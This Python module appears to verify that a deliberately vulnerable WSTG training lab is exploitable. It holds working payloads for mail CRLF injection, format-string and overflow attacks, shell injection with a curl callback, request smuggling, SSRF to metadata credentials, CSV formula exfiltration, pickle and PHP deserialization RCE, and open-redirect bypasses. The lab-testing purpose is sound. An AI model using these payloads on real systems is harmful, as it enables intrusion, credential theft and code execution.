"""WSTG probes for machine 06 - Server-side & Protocol Injection.

Each probe asserts the intentional weakness is demonstrably present, with
byte-level / timing / execution evidence (never just HTTP 200).
"""
import base64
import json
import pickle
import re
import time
import urllib.parse
import uuid

from labhttp import get, post, raw, request


def _hp(ctx, key):
    host, _, port = ctx.endpoints[key].partition(":")
    return host, int(port)


def _tok():
    return uuid.uuid4().hex[:8]


# --- INJT-10: IMAP / SMTP injection ------------------------------------------

def injt_10(ctx):
    extra = f"victim-{_tok()}@evil.test"
    mailbox = f"pwned-{_tok()}"
    # SMTP: CRLF in the sender adds an extra RCPT TO.
    email = f"alice@lab.test>\r\nRCPT TO:<{extra}"
    r = post(ctx.url("/contact"),
             data=urllib.parse.urlencode({"email": email, "rcpt": "support@lab.test", "message": "hi"}),
             headers={"Content-Type": "application/x-www-form-urlencoded"})
    transcript = r.json().get("transcript", [])
    smtp_ok = any("250" in line for line in transcript)
    # Confirm the injected recipient actually received the message via Mailpit.
    # Envelope recipients absent from the To: header are reported under Bcc.
    msgs = get(ctx.url("mail") + "/api/v1/messages").json().get("messages", [])
    delivered = False
    for m in msgs:
        detail = get(ctx.url("mail") + f"/api/v1/message/{m['ID']}").json()
        addrs = [a.get("Address") for field in ("To", "Cc", "Bcc")
                 for a in (detail.get(field) or [])]
        if extra in addrs:
            delivered = True
            break
    # IMAP: CRLF in the folder adds an extra CREATE command.
    folder = f'INBOX"\r\na900 CREATE "{mailbox}'
    w = get(ctx.url("/webmail?folder=" + urllib.parse.quote(folder, safe="")), timeout=20)
    imap_transcript = w.json().get("transcript", [])
    created = any("a900 OK" in line for line in imap_transcript)
    # Verify the injected mailbox exists, then clean up (idempotent).
    ih, ip = _hp(ctx, "imap")
    verify = raw(ih, ip,
                 f'a1 LOGIN alice Password123!\r\na2 LIST "" "*"\r\n'
                 f'a3 DELETE "{mailbox}"\r\na4 LOGOUT\r\n', timeout=12)
    listed = mailbox.encode() in verify and b"a2 OK" in verify
    ok = smtp_ok and delivered and created and listed
    return ok, (f"SMTP injected RCPT delivered={delivered} ({extra}); "
                f"IMAP injected CREATE ok={created} mailbox_listed={listed} ({mailbox})")


# --- INJT-13: Buffer overflow + format string --------------------------------

def injt_13(ctx):
    h, p = _hp(ctx, "native")
    # Controlled overflow overwrites the adjacent canary with 0x4242... and returns.
    ovf = raw(h, p, "OVF " + "A" * 64 + "BBBBBBBB\n", timeout=8)
    smashed = b"smashed=1" in ovf and b"0x4242424242424242" in ovf and b"OVF_DONE" in ovf
    # Longer overflow smashes the function pointer past the canary -> SIGSEGV
    # (the caller never reaches its OVF_DONE marker).
    try:
        crash = raw(h, p, "OVF " + "C" * 100 + "\n", timeout=8)
    except Exception:
        crash = b""
    crashed = b"OVF_DONE" not in crash
    # Format string leaks stack pointers (sequential %p).
    leak = raw(h, p, "FMT " + ".".join(["%p"] * 8) + "\n", timeout=8)
    ptrs = re.findall(rb"0x[0-9a-f]{6,}", leak)
    leaked = len(ptrs) >= 3
    # %s reads an arbitrary string from memory (scan sequential specifier counts).
    read_ok, read_k = False, None
    for k in range(1, 11):
        try:
            resp = raw(h, p, "FMT " + "%s" * k + "\n", timeout=6)
        except Exception:
            continue
        if b"FMT_STRING_LEAK_MARKER" in resp:
            read_ok, read_k = True, k
            break
    # %n writes memory, changing the local 'secret' (AAAA prefix => count 4).
    write_ok, write_k, write_val = False, None, None
    for k in range(1, 9):
        try:
            resp = raw(h, p, "FMT " + "AAAA" + "%n" * k + "\n", timeout=6)
        except Exception:
            continue
        m = re.search(rb"secret=(-?\d+)", resp)
        if m and m.group(1) != b"0":
            write_ok, write_k, write_val = True, k, m.group(1).decode()
            break
    ok = smashed and crashed and leaked and read_ok and write_ok
    return ok, (f"canary_smashed={smashed}(0x4242424242424242) overflow_crash={crashed}; "
                f"%p_leak={len(ptrs)}ptrs; %s_read(x{read_k})={read_ok}; "
                f"%n_write(x{write_k}) secret={write_val}")


# --- INJT-14: Incubated vulnerability ----------------------------------------

def injt_14(ctx):
    post(ctx.url("/incubate/reset"))
    post(ctx.url("listener") + "/reset")
    marker = _tok()
    payload = (f"report.txt; id; curl -s 'http://listener:8080/hit?stage=incubated"
               f"&proof={marker}'; echo ")
    store = post(ctx.url("/incubate/store"),
                 data={"filename": payload, "content": "benign"}).json()
    iid = store.get("id")
    # Stage 1: stored, HTML-escaped, NO execution / callback yet.
    hits1 = get(ctx.url("listener") + "/hits").json()["hits"]
    benign = not any("incubated" in h["path"] for h in hits1)
    escaped = "&" in store.get("display", "") or ";" in store.get("display", "")
    # Stage 2: recall -> separate worker runs the filename in a shell.
    recall = post(ctx.url("/incubate/recall"), data={"id": iid}).json()
    worker_out = recall.get("worker", "")
    executed = "uid=" in worker_out
    hits2 = get(ctx.url("listener") + "/hits").json()["hits"]
    callback = any(marker in h["path"] for h in hits2)
    post(ctx.url("/incubate/reset"))
    ok = benign and executed and callback and bool(iid)
    return ok, (f"stage1_benign_no_callback={benign} escaped_display={escaped}; "
                f"stage2_worker_executed_id={executed} listener_callback={callback} ({marker})")


# --- INJT-15: HTTP response splitting ----------------------------------------

def injt_15(ctx):
    h, p = _hp(ctx, "split")
    inj = "en%0d%0aX-Injected:%20pwned"
    r1 = raw(h, p, f"GET /legacy?lang={inj} HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n", timeout=8)
    header_injected = b"X-Injected: pwned" in r1
    second = "en%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Length:%205%0d%0a%0d%0aOWNED"
    r2 = raw(h, p, f"GET /legacy?lang={second} HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n", timeout=8)
    status_lines = r2.count(b"HTTP/1.1 200 OK")
    response_split = status_lines >= 2 and b"OWNED" in r2
    ok = header_injected and response_split
    return ok, (f"extra_header_injected={header_injected}; "
                f"second_response_split={response_split} (status_lines={status_lines}, OWNED present)")


# --- INJT-16: HTTP request smuggling -----------------------------------------

def injt_16(ctx):
    h, p = _hp(ctx, "smuggle")
    variants = ["xchunked", "chunked\t", "xchunked ", " chunked", "chunked"]
    worked, evidence = None, ""
    for te in variants:
        smuggled = "GET /smuggled HTTP/1.1\r\nHost: target\r\n\r\n"
        body = "0\r\n\r\n" + smuggled
        attack = (
            "POST / HTTP/1.1\r\nHost: target\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Transfer-Encoding: {te}\r\n\r\n" + body)
        innocent = "GET / HTTP/1.1\r\nHost: target\r\n\r\n"
        try:
            stream = raw(h, p, attack + innocent, timeout=8)
        except Exception:
            continue
        parts = stream.split(b"HTTP/1.1 ")[1:]
        if len(parts) >= 2 and b"SMUGGLED-RESPONSE" in parts[1]:
            worked = te
            evidence = parts[1].split(b"\r\n\r\n", 1)[-1][:80].decode(errors="replace")
            break
    ok = worked is not None
    return ok, (f"desync_variant={worked!r}; innocent 2nd request received smuggled response: {evidence!r}")


# --- INJT-17: Host header injection ------------------------------------------

def injt_17(ctx):
    evil = "evil.attacker.test"
    post(ctx.url("/host-cache/reset"))
    r1 = get(ctx.url("/password-reset?email=alice@lab.test"), headers={"Host": evil}).json()
    host_link = evil in r1.get("reset_link", "")
    r2 = get(ctx.url("/password-reset?email=alice@lab.test"),
             headers={"Host": "normal.lab", "X-Forwarded-Host": evil}).json()
    xfh = r2.get("host_used") == evil and evil in r2.get("reset_link", "")
    # duplicate Host headers survive
    hh, hp = ctx.base.split("//")[1].split(":")[0], int(ctx.base.rsplit(":", 1)[1])
    dup = raw(hh, hp, "GET /host-echo HTTP/1.1\r\nHost: first.lab\r\nHost: second.lab\r\nConnection: close\r\n\r\n", timeout=8)
    dup_body = dup.split(b"\r\n\r\n", 1)[-1]
    try:
        hosts = json.loads(dup_body).get("host_headers", [])
    except Exception:
        hosts = []
    # Werkzeug may keep duplicates as a list or comma-merge them; either way
    # both attacker-supplied Host values are accepted and processed.
    joined = ",".join(hosts)
    duplicate = len(hosts) >= 2 or ("first.lab" in joined and "second.lab" in joined)
    # cache poisoning keyed on URL only
    path = f"/host-cache/page?probe={_tok()}"
    poison = get(ctx.url(path), headers={"X-Forwarded-Host": evil})
    victim = get(ctx.url(path))
    poisoned = (poison.header("X-Cache") == "MISS" and victim.header("X-Cache") == "HIT"
                and evil in victim.text)
    ok = host_link and xfh and duplicate and poisoned
    return ok, (f"reset_link_host_injection={host_link}; X-Forwarded-Host_precedence={xfh}; "
                f"duplicate_Host={hosts}; cache_poison_served_to_victim={poisoned} (X-Cache={victim.header('X-Cache')})")


# --- INJT-19: SSRF -----------------------------------------------------------

def injt_19(ctx):
    internal = get(ctx.url("/fetch?url=http://internal:8080/secret")).json()
    internal_ok = "WSTG-M06{internal_only" in internal.get("body", "")
    meta_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/acme-portal-role"
    meta = get(ctx.url("/fetch?url=" + urllib.parse.quote(meta_url, safe=""))).json()
    meta_ok = "ASIAFAKEKEYID000000" in meta.get("body", "")
    f = get(ctx.url("/fetch?url=file:///etc/passwd")).json()
    file_ok = re.search(r"root:.*:0:0:", f.get("body", "")) is not None
    gopher = ("gopher://internal:8080/_GET%20/secret%20HTTP/1.1%0d%0aHost:%20internal%0d%0a%0d%0a")
    g = get(ctx.url("/fetch?url=" + urllib.parse.quote(gopher, safe=""))).json()
    gopher_ok = "WSTG-M06{internal_only" in g.get("body", "")
    ok = internal_ok and meta_ok and file_ok and gopher_ok
    return ok, (f"internal_only={internal_ok}; metadata_creds={meta_ok}; "
                f"file_passwd={file_ok}; gopher_internal={gopher_ok}")


# --- INJT-20: Mass assignment ------------------------------------------------

def injt_20(ctx):
    post(ctx.url("/api/users/reset"))
    normal = post(ctx.url("/api/users"), data={"name": "bob", "email": "bob@lab.test"}).json()
    bob_id = normal["id"]
    bob_admin = normal.get("is_admin") is False
    esc = post(ctx.url("/api/users"),
               data={"name": "mallory", "email": "m@lab.test", "id": "mallory1",
                     "is_admin": True, "role": "admin", "balance": 9999}).json()
    escalated = esc.get("is_admin") is True and esc.get("role") == "admin" and esc.get("balance") == 9999
    flag = get(ctx.url("/api/admin/flag?user_id=mallory1"))
    flag_ok = flag.status == 200 and "WSTG-M06{" in flag.text
    denied = get(ctx.url("/api/admin/flag?user_id=" + bob_id))
    denied_ok = denied.status == 403
    post(ctx.url("/api/users/reset"))
    ok = bob_admin and escalated and flag_ok and denied_ok
    return ok, (f"normal_user_is_admin={normal.get('is_admin')}; "
                f"mass_assigned_is_admin={esc.get('is_admin')}/role={esc.get('role')}/balance={esc.get('balance')}; "
                f"admin_flag={flag.status}(normal_user_denied={denied.status})")


# --- INJT-21: CSV injection --------------------------------------------------

def injt_21(ctx):
    post(ctx.url("/feedback/reset"))
    post(ctx.url("listener") + "/reset")
    marker = _tok()
    dde = "=cmd|'/C calc'!A0"
    hyperlink = f'=HYPERLINK("http://listener:8080/hit?csv=EXFIL-{marker}","click")'
    post(ctx.url("/feedback"), data={"name": "alice", "comment": dde})
    post(ctx.url("/feedback"), data={"name": "bob", "comment": hyperlink})
    csv_text = get(ctx.url("/export.csv")).text
    raw_dde = ",=cmd|'/C calc'!A0" in csv_text
    raw_hl = f",=HYPERLINK(" in csv_text
    neutralised = csv_text.count("'=") > 0  # leading apostrophe would neutralise
    opened = post(ctx.url("listener") + "/csv-open", data=csv_text,
                  headers={"Content-Type": "text/csv"}).json()
    interpreted = any(c.startswith("=cmd|") for c in opened.get("formula_cells", []))
    exfil = any(f"EXFIL-{marker}" in h.get("url", "") and h.get("status") == 200
                for h in opened.get("hyperlinks_fetched", []))
    dde_rec = len(opened.get("dde_attempts", [])) >= 1
    hits = get(ctx.url("listener") + "/hits").json()["hits"]
    callback = any(f"EXFIL-{marker}" in h["path"] for h in hits)
    post(ctx.url("/feedback/reset"))
    ok = raw_dde and raw_hl and not neutralised and interpreted and exfil and dde_rec and callback
    return ok, (f"export_unescaped_DDE={raw_dde} HYPERLINK={raw_hl} neutralised={neutralised}; "
                f"csv-open_interpreted={interpreted} dde_recorded={dde_rec}; "
                f"HYPERLINK_exfil_to_listener={exfil and callback} ({marker})")


# --- INJT-23: Insecure deserialization (Python + PHP) ------------------------

def injt_23(ctx):
    # Python pickle __reduce__ -> eval -> read flag / run id
    class FlagPick:
        def __reduce__(self):
            return (eval, ("__import__('os').popen('cat /flag.txt').read()",))

    class IdPick:
        def __reduce__(self):
            return (eval, ("__import__('os').popen('id').read()",))

    pf = base64.b64encode(pickle.dumps(FlagPick())).decode()
    pi = base64.b64encode(pickle.dumps(IdPick())).decode()
    pyflag = get(ctx.url("/pickle?data=" + urllib.parse.quote(pf, safe=""))).json()
    pyid = get(ctx.url("/pickle?data=" + urllib.parse.quote(pi, safe=""))).json()
    py_ok = "WSTG-M06{pickle_rce" in pyflag.get("result", "") and "uid=" in pyid.get("result", "")
    # PHP POP chain: Report.__wakeup -> Reader.__toString -> file_get_contents(/flag.txt)
    chain = 'O:6:"Report":1:{s:5:"title";O:6:"Reader":1:{s:4:"path";s:9:"/flag.txt";}}'
    phpflag = get(ctx.url("php") + "/?data=" + urllib.parse.quote(base64.b64encode(chain.encode()).decode(), safe=""))
    php_ok = "WSTG-M06{php_pop_chain" in phpflag.text
    # PHP Executor.__destruct -> shell_exec('id')
    exec_payload = 'O:8:"Executor":1:{s:3:"cmd";s:2:"id";}'
    phpexec = get(ctx.url("php") + "/?data=" + urllib.parse.quote(base64.b64encode(exec_payload.encode()).decode(), safe=""))
    php_rce = "uid=" in phpexec.text
    ok = py_ok and php_ok and php_rce
    return ok, (f"pickle_RCE_flag={py_ok} (id={'uid=' in pyid.get('result','')}); "
                f"PHP_POP_flag={php_ok}; PHP_Executor_shell_exec={php_rce}")


# --- INJT-24: Server-side URL redirect ---------------------------------------

def injt_24(ctx):
    post(ctx.url("listener") + "/reset")
    evil = "evil.attacker.test"
    variants = [f"//{evil}/", f"%2f%2f{evil}", f"\\/\\/{evil}/", f"https://trusted.lab@{evil}/"]
    results = {}
    for v in variants:
        r = get(ctx.url("/redirect?url=" + urllib.parse.quote(v, safe="")))
        loc = r.header("Location", "")
        results[v] = (r.status, evil in loc)
    bypassed = all(s == 302 and e for s, e in results.values())
    # contrast: a plainly-external target is rejected by the validator
    blocked = get(ctx.url("/redirect?url=" + urllib.parse.quote(f"http://{evil}/", safe="")))
    blocked_ok = blocked.status == 400
    # the SERVER fetched the target during validation (logged in-range)
    hits = get(ctx.url("listener") + "/hits").json()["hits"]
    server_fetched = any(evil in h["host"] for h in hits)
    ok = bypassed and blocked_ok and server_fetched
    return ok, (f"bypass_302_to_evil={results}; plain_external_blocked={blocked.status}; "
                f"server_side_validation_fetch_logged={server_fetched}")


# --- INJT-27: Server-side document rendering injection -----------------------

def injt_27(ctx):
    html = (
        "<html><body><div id=out></div><script>"
        "var o=document.getElementById('out');"
        "try{var x=new XMLHttpRequest();x.open('GET','file:///etc/passwd',false);x.send();"
        "o.innerHTML+='<pre id=passwd>'+x.responseText+'</pre>';}catch(e){o.innerHTML+='ERR1:'+e;}"
        "try{var y=new XMLHttpRequest();y.open('GET','http://internal:8080/secret',false);y.send();"
        "o.innerHTML+='<pre id=ssrf>'+y.responseText+'</pre>';}catch(e){o.innerHTML+='ERR2:'+e;}"
        "o.innerHTML+='<pre id=js>JS_EXECUTED_MARKER</pre>';"
        "</script></body></html>")
    r = post(ctx.url("renderer") + "/render", data={"html": html}, timeout=60).json()
    content = r.get("content", "")
    file_read = re.search(r"root:.*:0:0:", content) is not None
    ssrf = "WSTG-M06{internal_only" in content
    js_exec = "JS_EXECUTED_MARKER" in content
    req_internal = any("internal:8080/secret" in u for u in r.get("requests", []))
    pdf = (r.get("pdf_base64") or "").startswith("JVBERi")
    ok = file_read and ssrf and js_exec and req_internal
    return ok, (f"renderer_file_passwd={file_read}; SSRF_internal_secret={ssrf}; "
                f"JS_executed={js_exec}; internal_request_seen={req_internal}; pdf_generated={pdf}")


# --- INJT-28: ReDoS ----------------------------------------------------------

def injt_28(ctx):
    fast = get(ctx.url("/validate?username=aaa"), timeout=15).json()
    payload = "a" * 27 + "!"
    t0 = time.time()
    slow = get(ctx.url("/validate?username=" + payload), timeout=40).json()
    wall = time.time() - t0
    fe, se = fast.get("elapsed", 0), slow.get("elapsed", 0)
    ok = fe < 0.3 and se > 1.0 and se / max(fe, 1e-6) > 5 and slow.get("matched") is False
    return ok, (f"short_input_elapsed={fe:.4f}s; crafted_{len(payload)}char_elapsed={se:.3f}s "
                f"(wall={wall:.2f}s) ratio={se/max(fe,1e-6):.0f}x matched={slow.get('matched')}")